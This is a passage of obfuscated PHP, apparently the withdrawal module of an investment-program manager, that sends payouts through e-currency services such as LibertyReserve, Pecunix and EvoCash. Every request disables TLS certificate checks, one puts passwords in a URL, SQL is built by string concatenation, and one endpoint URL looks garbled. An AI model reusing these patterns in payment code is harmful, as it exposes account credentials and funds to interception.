      curl_setopt ($elnlcEPBUz, CURLOPT_POSTFIELDS, 'AccountID=' . rawurlencode ($elnlcSuVc[$elnlcsyENS['elnlcVLuu']]) . '&PassPhrase=' . rawurlencode ($elnlcwVkl) . '&Payee_Account=' . rawurlencode ($elnlcOPfeJ) . '&Amount=' . rawurlencode ($elnlcrUqv) . '&PAY_IN=' . rawurlencode ($elnlcSuVc[$elnlcsyENS['elnlcVdTH']]) . ('' . '&WORTH_OF=Gold&Memo=' . $elnlcgDnCo . '&IGNORE_RATE_CHANGE=y'));
      curl_setopt ($elnlcEPBUz, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcEPBUz, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcEPBUz);
      curl_close ($elnlcEPBUz);
      $elnlcQSee = array ();
      if (preg_match ('/<input type=hidden name=PAYMENT_BATCH_NUM VALUE="(\\d+)">/ims', $a, $elnlcQSee))
      {
        return array (1, '', $elnlcQSee[1]);
      }
      else
      {
        if (preg_match ('/<input type=hidden name=ERROR VALUE="(.*?)">/ims', $a, $elnlcQSee))
        {
          $elnlcuANCI = preg_replace ('/&lt;/i', '<', $elnlcQSee[1]);
          $elnlcuANCI = preg_replace ('/&gt;/i', '>', $elnlcuANCI);
          $e = elnlcnczen ('' . $elnlcRWgpq . ' ' . $elnlcuANCI);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcRWgpq . ('' . ' ' . $elnlcuANCI), '');
        }
        else
        {
          $e = elnlcnczen ('' . $elnlcRWgpq . ' Unknown error');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcRWgpq . ' Unknown error', '');
        }
      }
    }
    else
    {
      $e = elnlcnczen ('' . $elnlcRWgpq . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcRWgpq . ' Curl functions are not available');
    }

  }

  function elnlchivv ($elnlcnOll, $elnlcrUqv, $elnlcOPfeJ, $elnlcgDnCo, $elnlcRWgpq)
  {
    global $elnlcsyENS;
    global $elnlcSuVc;
    if ($elnlcSuVc[$elnlcsyENS['elnlcIEsb']] == $elnlcsyENS['elnlcjCSJ'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcSuVc[$elnlcsyENS['elnlciwSzJ']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcOPfeJ == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to AlertPay account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid AlertPay account', '');
    }

    list ($elnlcPIOsC, $elnlcLAPT) = elnlcvkpnr ($elnlcOPfeJ, 11);
    if ($elnlcPIOsC == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcLAPT . '\'';
      mysql_query ($q);
      return array (0, $elnlcLAPT);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcnOll == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'alertpay_account_password\'';
        $elnlchGkPU = mysql_query ($q);
        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
        {
          $elnlcGcHiF = elnlctiim ($elnlcCgqPK[$elnlcsyENS['elnlcOnrTm']], $elnlcsyENS['elnlcWfUti']);
        }
      }
      else
      {
        $elnlcGcHiF = $elnlcnOll;
      }

      $elnlcEPBUz = curl_init ();
      $elnlcgDnCo = rawurlencode ($elnlcgDnCo);
      $elnlcoFEhc = sprintf ('USER=%s&PASSWORD=%s&AMOUNT=%s&CURRENCY=%s&RECEIVEREMAIL=%s&SENDEREMAIL=%s&PURCHASETYPE=%s&NOTE=%s&TESTMODE=%s', urlencode ($elnlcSuVc[$elnlcsyENS['elnlcLAKP']]), urlencode ($elnlcGcHiF), urlencode ($elnlcrUqv), 'USD', urlencode ($elnlcOPfeJ), '', 0, urlencode ($elnlcgDnCo), 0);
      curl_setopt ($elnlcEPBUz, CURLOPT_URL, $elnlcsyENS['elnlctRPR']);
      curl_setopt ($elnlcEPBUz, CURLOPT_POST, true);
      curl_setopt ($elnlcEPBUz, CURLOPT_POSTFIELDS, $elnlcoFEhc);
      curl_setopt ($elnlcEPBUz, CURLOPT_RETURNTRANSFER, true);
      curl_setopt ($elnlcEPBUz, CURLOPT_HEADER, false);
      curl_setopt ($elnlcEPBUz, CURLOPT_TIMEOUT, 30);
      curl_setopt ($elnlcEPBUz, CURLOPT_SSL_VERIFYPEER, false);
      $a = curl_exec ($elnlcEPBUz);
      curl_close ($elnlcEPBUz);
      parse_str (urldecode ($a), $elnlcvmyPB);
      $elnlcQSee = array ();
      if ($elnlcvmyPB[$elnlcsyENS['elnlcAoFu']] == 100)
      {
        return array (1, '', $elnlcvmyPB[$elnlcsyENS['elnlcDivy']]);
      }
      else
      {
        if (200 < $elnlcvmyPB[$elnlcsyENS['elnlcAoFu']])
        {
          $elnlcuANCI = $elnlcvmyPB[$elnlcsyENS['elnlcAoFu']] . ': ' . $elnlcvmyPB[$elnlcsyENS['elnlczNyCS']];
          $e = elnlcnczen ('' . $elnlcRWgpq . ' ' . $elnlcuANCI);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcRWgpq . ('' . ' ' . $elnlcuANCI), '');
        }
        else
        {
          $e = elnlcnczen ('' . $elnlcRWgpq . ' Unknown error');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcRWgpq . ' Unknown error', '');
        }
      }
    }
    else
    {
      $e = elnlcnczen ('' . $elnlcRWgpq . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcRWgpq . ' Curl functions are not available');
    }

  }

  function elnlcmatra ($elnlcnOll, $elnlcrUqv, $elnlcOPfeJ, $elnlcgDnCo, $elnlcRWgpq)
  {
    global $elnlcsyENS;
    global $elnlcSuVc;
    $elnlcrUqv = sprintf ('%0.2f', floor ($elnlcrUqv * 100) / 100);
    if ($elnlcSuVc[$elnlcsyENS['elnlciwSzJ']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcOPfeJ == 0)
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can not process withdrawal to Evocash account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid EvoCash account', '');
    }

    list ($elnlcPIOsC, $elnlcLAPT) = elnlcvkpnr ($elnlcOPfeJ, 1);
    if ($elnlcPIOsC == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcLAPT . '\'';
      mysql_query ($q);
      return array (0, $elnlcLAPT);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcnOll == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'evocash_account_password\'';
        $elnlchGkPU = mysql_query ($q);
        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
        {
          $elnlcSTix = elnlctiim ($elnlcCgqPK[$elnlcsyENS['elnlcOnrTm']], $elnlcsyENS['elnlcWfUti']);
        }

        $q = 'select v from hm2_pay_settings where n=\'evocash_transaction_code\'';
        $elnlchGkPU = mysql_query ($q);
        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
        {
          $elnlcVGNNs = elnlctiim ($elnlcCgqPK[$elnlcsyENS['elnlcOnrTm']], $elnlcsyENS['elnlcWfUti']);
        }
      }
      else
      {
        list ($elnlcSTix, $elnlcVGNNs) = preg_split ('/\\|/', $elnlcnOll);
      }

      $elnlcEPBUz = curl_init ();
      $elnlcgDnCo = rawurlencode ($elnlcgDnCo);
      curl_setopt ($elnlcEPBUz, CURLOPT_URL, 'https://www.evocash.com/evoswift/instantpayment.cfm?payingaccountid=' . rawurlencode ($elnlcSuVc[$elnlcsyENS['elnlceqvu']]) . '&username=' . rawurlencode ($elnlcSuVc[$elnlcsyENS['elnlcDzhGd']]) . '&password=' . rawurlencode ($elnlcSTix) . '&transaction_code=' . rawurlencode ($elnlcVGNNs) . '&amount=' . rawurlencode ($elnlcrUqv) . ('' . '&reference=&memo=' . $elnlcgDnCo . '&receivingaccountid=') . rawurlencode ($elnlcOPfeJ) . '');
      curl_setopt ($elnlcEPBUz, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcEPBUz, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcEPBUz);
      curl_close ($elnlcEPBUz);
      $elnlcQSee = array ();
      if (preg_match ('/<INPUT TYPE="Hidden" NAME="PayingTransactionID" VALUE="(.*?)">/ims', $a, $elnlcQSee))
      {
        return array (1, '', $elnlcQSee[1]);
      }
      else
      {
        if (preg_match ('/<INPUT TYPE="Hidden" NAME="Error" VALUE="(.*?)">/ims', $a, $elnlcQSee))
        {
          $elnlcuANCI = $elnlcQSee[1];
          $e = elnlcnczen ('' . $elnlcRWgpq . ' ' . $elnlcuANCI);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcRWgpq . ('' . ' ' . $elnlcuANCI), '');
        }
        else
        {
          $e = elnlcnczen ('' . $elnlcRWgpq . ' Unknown error');
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $elnlcRWgpq . ' Unknown error', '');
        }
      }
    }
    else
    {
      $e = elnlcnczen ('' . $elnlcRWgpq . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcRWgpq . ' Curl functions are not available');
    }

  }

  function elnlcfvxzr ($elnlcnOll, $elnlcrUqv, $elnlcOPfeJ, $elnlcgDnCo, $elnlcRWgpq)
  {
    global $elnlcsyENS;
    global $elnlcSuVc;
    if ($elnlcSuVc[$elnlcsyENS['elnlcIEsb']] == $elnlcsyENS['elnlcjCSJ'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcSuVc[$elnlcsyENS['elnlciwSzJ']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcOPfeJ == 0)
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to IntGold account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid IntGold account', '');
    }

    list ($elnlcPIOsC, $elnlcLAPT) = elnlcvkpnr ($elnlcOPfeJ, 2);
    if ($elnlcPIOsC == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcLAPT . '\'';
      mysql_query ($q);
      return array (0, $elnlcLAPT);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcnOll == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'intgold_password\'';
        $elnlchGkPU = mysql_query ($q);
        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
        {
          $elnlcHUEFE = elnlctiim ($elnlcCgqPK[$elnlcsyENS['elnlcOnrTm']], $elnlcsyENS['elnlcWfUti']);
        }
      }
      else
      {
        $elnlcHUEFE = $elnlcnOll;
      }

      if ($elnlcnOll == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'intgold_password\'';
        $elnlchGkPU = mysql_query ($q);
        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
        {
          $elnlcHUEFE = elnlctiim ($elnlcCgqPK[$elnlcsyENS['elnlcOnrTm']], $elnlcsyENS['elnlcWfUti']);
        }

        $q = 'select v from hm2_pay_settings where n=\'intgold_transaction_code\'';
        $elnlchGkPU = mysql_query ($q);
        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
        {
          $elnlclsFk = elnlctiim ($elnlcCgqPK[$elnlcsyENS['elnlcOnrTm']], $elnlcsyENS['elnlcWfUti']);
        }
      }
      else
      {
        list ($elnlcHUEFE, $elnlclsFk) = preg_split ('/\\|/', $elnlcnOll);
      }

      $elnlcEPBUz = curl_init ();
      $elnlcgDnCo = rawurlencode ($elnlcgDnCo);
      curl_setopt ($elnlcEPBUz, CURLOPT_URL, 'https://intgold.com/cgi-bin/autopay.cgi');
      curl_setopt ($elnlcEPBUz, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcEPBUz, CURLOPT_POST, 1);
      curl_setopt ($elnlcEPBUz, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)');
      curl_setopt ($elnlcEPBUz, CURLOPT_POSTFIELDS, 'ACCOUNTID=' . rawurlencode ($elnlcSuVc[$elnlcsyENS['elnlcrKoT']]) . '&PASSWORD=' . rawurlencode ($elnlcHUEFE) . '&SECPASSWORD=' . rawurlencode ($elnlclsFk) . '&RECEIVER=' . rawurlencode ($elnlcOPfeJ) . '&AMOUNT=' . rawurlencode ($elnlcrUqv) . '&NOTE=' . $elnlcgDnCo);
      curl_setopt ($elnlcEPBUz, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt ($elnlcEPBUz, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcEPBUz);
      curl_close ($elnlcEPBUz);
      $elnlcQSee = array ();
      if (preg_match ('' . '/Success\\s*TRANSACTION_ID:(.*?)$/ims', $a, $elnlcQSee))
      {
        return array (1, '', $elnlcQSee[1]);
      }
      else
      {
        $e = elnlcnczen ('' . $elnlcRWgpq . ' ' . $a);
        $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
        mysql_query ($q);
        return array (0, $elnlcRWgpq . ('' . ' ' . $a), '');
      }
    }
    else
    {
      $e = elnlcnczen ('' . $elnlcRWgpq . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcRWgpq . ' Curl functions are not available');
    }

  }

  function elnlcuuenw ($elnlcnOll, $elnlcrUqv, $elnlcOPfeJ, $elnlcgDnCo, $elnlcRWgpq)
  {
    global $elnlcsyENS;
    global $elnlcSuVc;
    if ($elnlcSuVc[$elnlcsyENS['elnlcIEsb']] == $elnlcsyENS['elnlcjCSJ'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcSuVc[$elnlcsyENS['elnlciwSzJ']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcOPfeJ == 0)
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to eeeCureency account 0.\'';
      mysql_query ($q);
      return array (0, 'Invalid eeeCurrency account', '');
    }

    list ($elnlcPIOsC, $elnlcLAPT) = elnlcvkpnr ($elnlcOPfeJ, 8);
    if ($elnlcPIOsC == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcLAPT . '\'';
      mysql_query ($q);
      return array (0, $elnlcLAPT);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcnOll == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'eeecurrency_password\'';
        $elnlchGkPU = mysql_query ($q);
        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
        {
          $elnlctaAb = elnlctiim ($elnlcCgqPK[$elnlcsyENS['elnlcOnrTm']], $elnlcsyENS['elnlcWfUti']);
        }

        $q = 'select v from hm2_pay_settings where n=\'eeecurrency_transaction_code\'';
        $elnlchGkPU = mysql_query ($q);
        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
        {
          $elnlcMhQmK = elnlctiim ($elnlcCgqPK[$elnlcsyENS['elnlcOnrTm']], $elnlcsyENS['elnlcWfUti']);
        }
      }
      else
      {
        list ($elnlctaAb, $elnlcMhQmK) = preg_split ('/\\|/', $elnlcnOll);
      }

      $elnlcEPBUz = curl_init ();
      $elnlcgDnCo = rawurlencode ($elnlcgDnCo);
      curl_setopt ($elnlcEPBUz, CURLOPT_URL, 'https://eeecurrency.com/cgi-bin/autopay.cgi');
      curl_setopt ($elnlcEPBUz, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcEPBUz, CURLOPT_POST, 1);
      curl_setopt ($elnlcEPBUz, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)');
      curl_setopt ($elnlcEPBUz, CURLOPT_POSTFIELDS, 'ACCOUNTID=' . rawurlencode ($elnlcSuVc[$elnlcsyENS['elnlcSlfGU']]) . '&PASSWORD=' . rawurlencode ($elnlctaAb) . '&SECPASSWORD=' . rawurlencode ($elnlcMhQmK) . '&RECEIVER=' . rawurlencode ($elnlcOPfeJ) . '&AMOUNT=' . rawurlencode ($elnlcrUqv) . ('' . '&NOTE=' . $elnlcgDnCo));
      curl_setopt ($elnlcEPBUz, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcEPBUz);
      curl_close ($elnlcEPBUz);
      $elnlcQSee = array ();
      if (preg_match ('' . '/Success\\s*TRANSACTION_ID:(.*?)$/ims', $a, $elnlcQSee))
      {
        return array (1, '', $elnlcQSee[1]);
      }
      else
      {
        $e = elnlcnczen ('' . $elnlcRWgpq . ' ' . $a);
        $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
        mysql_query ($q);
        return array (0, $elnlcRWgpq . ('' . ' ' . $a), '');
      }
    }
    else
    {
      $e = elnlcnczen ('' . $elnlcRWgpq . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcRWgpq . ' Curl functions are not available');
    }

  }

  function elnlcdaov ($elnlcnOll, $elnlcrUqv, $elnlcOPfeJ, $elnlcgDnCo, $elnlcRWgpq)
  {
    global $elnlcsyENS;
    global $elnlcSuVc;
    if ($elnlcSuVc[$elnlcsyENS['elnlcIEsb']] == $elnlcsyENS['elnlcjCSJ'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcSuVc[$elnlcsyENS['elnlciwSzJ']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcOPfeJ == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty Pecunix account.\'';
      mysql_query ($q);
      return array (0, 'Invalid Pecunix account', '');
    }

    list ($elnlcPIOsC, $elnlcLAPT) = elnlcvkpnr ($elnlcOPfeJ, 9);
    if ($elnlcPIOsC == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcLAPT . '\'';
      mysql_query ($q);
      return array (0, $elnlcLAPT);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcnOll == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'pecunix_password\'';
        $elnlchGkPU = mysql_query ($q);
        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
        {
          $elnlcFPrr = elnlctiim ($elnlcCgqPK[$elnlcsyENS['elnlcOnrTm']], $elnlcsyENS['elnlcWfUti']);
        }
      }
      else
      {
        $elnlcFPrr = $elnlcnOll;
      }

      $elnlcEPBUz = curl_init ();
      $elnlcLluj = elnlcptwmv ('{px_time}');
      $elnlcOATM = strtoupper (md5 ($elnlcFPrr . ':' . $elnlcLluj));
      $elnlcoFEhc = '
    <TransferRequest>
      <Transfer>
        <TransferId> </TransferId>
        <Payer> ' . htmlentities ($elnlcSuVc[$elnlcsyENS['elnlcAbwg']], ENT_NOQUOTES) . ' </Payer>
        <Payee> ' . htmlentities ($elnlcOPfeJ, ENT_NOQUOTES) . ' </Payee>
        <CurrencyId> GAU </CurrencyId>
        <Equivalent>
          <CurrencyId> USD </CurrencyId>
          <Amount> ' . htmlentities ($elnlcrUqv, ENT_NOQUOTES) . ' </Amount>
        </Equivalent>
        <FeePaidBy> Payee </FeePaidBy>
        <Memo> ' . htmlentities ($elnlcgDnCo, ENT_NOQUOTES) . ('' . ' </Memo>
      </Transfer>
      <Auth>
        <Token> ' . $elnlcOATM . ' </Token>
      </Auth>
    </TransferRequest>
    ');
      $elnlcEPBUz = curl_init ();
      curl_setopt ($elnlcEPBUz, CURLOPT_URL, 'https://pxi.pecunix.com/money.refined...transfer');
      curl_setopt ($elnlcEPBUz, CURLOPT_POST, 1);
      curl_setopt ($elnlcEPBUz, CURLOPT_POSTFIELDS, $elnlcoFEhc);
      curl_setopt ($elnlcEPBUz, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcEPBUz, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcEPBUz);
      curl_close ($elnlcEPBUz);
      $elnlcaMIz = elnlcwbil ($a);
      if ($elnlcaMIz[$elnlcsyENS['elnlccotiB']] == $elnlcsyENS['elnlcvncu'])
      {
        return array (1, '', $elnlcaMIz[$elnlcsyENS['elnlcwuPu']]);
      }
      else
      {
        if ($elnlcaMIz[$elnlcsyENS['elnlccotiB']] == $elnlcsyENS['elnlcaoJE'])
        {
          $e = elnlcnczen ('' . $elnlcRWgpq . ' ' . $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] . ' ' . $elnlcaMIz[$elnlcsyENS['elnlcJcklA']]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = elnlcnczen ('' . $elnlcRWgpq . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = elnlcnczen ('' . $elnlcRWgpq . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcRWgpq . ' Curl functions are not available');
    }

  }

  function elnlcdjefm ($elnlcnOll, $elnlcrUqv, $elnlcOPfeJ, $elnlcgDnCo, $elnlcRWgpq)
  {
    global $elnlcsyENS;
    global $elnlcSuVc;
    if ($elnlcSuVc[$elnlcsyENS['elnlcIEsb']] == $elnlcsyENS['elnlcjCSJ'])
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcSuVc[$elnlcsyENS['elnlciwSzJ']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcOPfeJ == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty LibertyReserve account.\'';
      mysql_query ($q);
      return array (0, 'Invalid LibertyReserve account', '');
    }

    list ($elnlcPIOsC, $elnlcLAPT) = elnlcvkpnr ($elnlcOPfeJ, 15);
    if ($elnlcPIOsC == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcLAPT . '\'';
      mysql_query ($q);
      return array (0, $elnlcLAPT);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcnOll == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'libertyreserve_password\'';
        $elnlchGkPU = mysql_query ($q);
        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
        {
          $elnlcidUip = elnlctiim ($elnlcCgqPK[$elnlcsyENS['elnlcOnrTm']], $elnlcsyENS['elnlcWfUti']);
        }

        $elnlcdEOkM = $elnlcSuVc[$elnlcsyENS['elnlcFtJD']];
      }
      else
      {
        list ($elnlcidUip, $elnlcdEOkM) = preg_split ('/\\|/', $elnlcnOll);
      }

      $elnlcEPBUz = curl_init ();
      $elnlcOATM = strtoupper (elnlcptwmv ($elnlcidUip . ':{lr_time}'));
      $elnlcoFEhc = '<TransferRequest id="' . rand (1000000, 9999999) . '">
  <Auth>
    <ApiName>' . htmlspecialchars ($elnlcdEOkM) . ('' . '</ApiName>
    <Token>' . $elnlcOATM . '</Token>
  </Auth>
  <Transfer>
    <TransferType>transfer</TransferType>
    <Payer>') . htmlentities ($elnlcSuVc[$elnlcsyENS['elnlcLVkmf']], ENT_NOQUOTES) . '</Payer>
    <Payee>' . htmlentities ($elnlcOPfeJ, ENT_NOQUOTES) . '</Payee>
    <CurrencyId>' . htmlentities ($elnlcSuVc[$elnlcsyENS['elnlcUkga']]) . '</CurrencyId>
    <Amount>' . htmlentities ($elnlcrUqv, ENT_NOQUOTES) . '</Amount>
    <Memo>' . htmlentities ($elnlcgDnCo, ENT_NOQUOTES) . '</Memo>
    <Anonymous>false</Anonymous>
  </Transfer>
</TransferRequest>';
      $elnlcEPBUz = curl_init ();
      curl_setopt ($elnlcEPBUz, CURLOPT_URL, 'https://api.libertyreserve.com/xml/transfer.aspx?req=' . urlencode ($elnlcoFEhc));
      curl_setopt ($elnlcEPBUz, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcEPBUz, CURLOPT_RETURNTRANSFER, 1);
      $elnlcsUbby = array ('User-Agent: Mozilla/5.0');
      curl_setopt ($elnlcEPBUz, CURLOPT_HTTPHEADER, $elnlcsUbby);
      $a = curl_exec ($elnlcEPBUz);
      curl_close ($elnlcEPBUz);
      $elnlcSuVc[$elnlcsyENS['elnlcdOjrc']] = $elnlcoFEhc;
      $elnlcSuVc[$elnlcsyENS['elnlcRBjUy']] = $a;
      $elnlcaMIz = elnlcrqgmr ($a);
      if ($elnlcaMIz[$elnlcsyENS['elnlccotiB']] == $elnlcsyENS['elnlcvncu'])
      {
        return array (1, '', $elnlcaMIz[$elnlcsyENS['elnlcwuPu']]);
      }
      else
      {
        if ($elnlcaMIz[$elnlcsyENS['elnlccotiB']] == $elnlcsyENS['elnlcaoJE'])
        {
          $e = elnlcnczen ('' . $elnlcRWgpq . ' ' . $elnlcaMIz[$elnlcsyENS['elnlcoJJM']] . '<br>' . $elnlcaMIz[$elnlcsyENS['elnlcJcklA']]);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
        else
        {
          $e = elnlcnczen ('' . $elnlcRWgpq . ' Parse error: ' . $a);
          $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
          mysql_query ($q);
          return array (0, $e, '');
        }
      }
    }
    else
    {
      $e = elnlcnczen ('' . $elnlcRWgpq . ' Curl functions are not available');
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $e . '\'';
      mysql_query ($q);
      return array (0, $elnlcRWgpq . ' Curl functions are not available');
    }

  }

  function elnlcpvgl ($elnlcnOll, $elnlcrUqv, $elnlcOPfeJ, $elnlcgDnCo, $elnlcRWgpq)
  {
    global $elnlcsyENS;
    global $elnlcSuVc;
    if ($elnlcSuVc[$elnlcsyENS['elnlcIEsb']] == $elnlcsyENS['elnlcjCSJ'])
    {
    }

    if ($elnlcSuVc[$elnlcsyENS['elnlciwSzJ']] == 1)
    {
      return array (1, '[transaction in demo mode]', '[transaction in demo mode]');
    }

    if ($elnlcOPfeJ == '')
    {
      $q = 'insert into hm2_pay_errors set date = now(), txt = \'Can`t process withdrawal to empty V-Money account.\'';
      mysql_query ($q);
      return array (0, 'Invalid V-Money account', '');
    }

    list ($elnlcPIOsC, $elnlcLAPT) = elnlcvkpnr ($elnlcOPfeJ, 16);
    if ($elnlcPIOsC == 0)
    {
      $q = '' . 'insert into hm2_pay_errors set date = now(), txt = \'' . $elnlcLAPT . '\'';
      mysql_query ($q);
      return array (0, $elnlcLAPT);
    }

    if (function_exists ('curl_init'))
    {
      if ($elnlcnOll == '')
      {
        $q = 'select v from hm2_pay_settings where n=\'vmoney_password\'';
        $elnlchGkPU = mysql_query ($q);
        while ($elnlcCgqPK = mysql_fetch_array ($elnlchGkPU))
        {
          $elnlcMVHR = elnlctiim ($elnlcCgqPK[$elnlcsyENS['elnlcOnrTm']], $elnlcsyENS['elnlcWfUti']);
        }
      }
      else
      {
        $elnlcMVHR = $elnlcnOll;
      }

      $elnlcOATM = md5 ($elnlcSuVc[$elnlcsyENS['elnlcGHir']] . $elnlcMVHR . elnlcptwmv ('{vm_time}'));
      $elnlcoFEhc = '<Request>
	<Type>Transfer</Type>
	<Auth>
		<AccountId>' . htmlentities ($elnlcSuVc[$elnlcsyENS['elnlcGHir']], ENT_NOQUOTES) . ('' . '</AccountId>
		<Token>' . $elnlcOATM . '</Token>
	</Auth>
	<Transfers>
		<Transfer>
			<ID>1</ID>
			<Payee>') . htmlentities ($elnlcOPfeJ, ENT_NOQUOTES) . '</Payee>
			<Amount>' . htmlentities ($elnlcrUqv, ENT_NOQUOTES) . '</Amount>
			<Memo>' . htmlentities ($elnlcgDnCo, ENT_NOQUOTES) . '</Memo>
		</Transfer>
	</Transfers>
        </Request>';
      $elnlcEPBUz = curl_init ();
      curl_setopt ($elnlcEPBUz, CURLOPT_URL, 'https://www.v-money.net/vai.php');
      curl_setopt ($elnlcEPBUz, CURLOPT_POST, 1);
      curl_setopt ($elnlcEPBUz, CURLOPT_POSTFIELDS, 'request_data=' . $elnlcoFEhc);
      curl_setopt ($elnlcEPBUz, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcEPBUz, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcEPBUz);
      curl_close ($elnlcEPBUz);
      $elnlcaMIz = elnlcragde ($a);
      if ($elnlcaMIz[$elnlcsyENS['elnlccotiB']] == $elnlcsyENS['elnlcvncu'])
      {
